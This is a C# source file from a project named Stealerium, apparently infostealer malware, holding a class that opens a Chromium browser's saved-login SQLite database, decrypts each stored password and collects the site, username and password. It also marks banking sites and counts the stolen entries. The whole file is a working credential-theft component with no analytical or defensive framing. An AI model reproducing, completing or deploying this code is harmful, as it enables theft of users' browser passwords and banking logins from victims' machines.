using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Passwords
    {
        /// <summary>
        ///     Get passwords from chromium based browsers
        /// </summary>
        /// <param name="sLoginData"></param>
        /// <returns>List with passwords</returns>
        public static List<Password> Get(string sLoginData)
        {
            var pPasswords = new List<Password>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sLoginData, "logins");
                if (sSqLite == null) return pPasswords;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var pPassword = new Password
                    {
                        Url = Crypto.GetUtf8(sSqLite.GetValue(i, 0)),
                        Username = Crypto.GetUtf8(sSqLite.GetValue(i, 3))
                    };

                    var sPassword = sSqLite.GetValue(i, 5);

                    if (sPassword == null) continue;
                    pPassword.Pass = Crypto.GetUtf8(Crypto.EasyDecrypt(sLoginData, sPassword));
                    pPasswords.Add(pPassword);

                    // Analyze value
                    Banking.ScanData(pPassword.Url);
                    Counter.Passwords++;
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect passwords\n" + ex);
            }

            return pPasswords;
        }
    }
}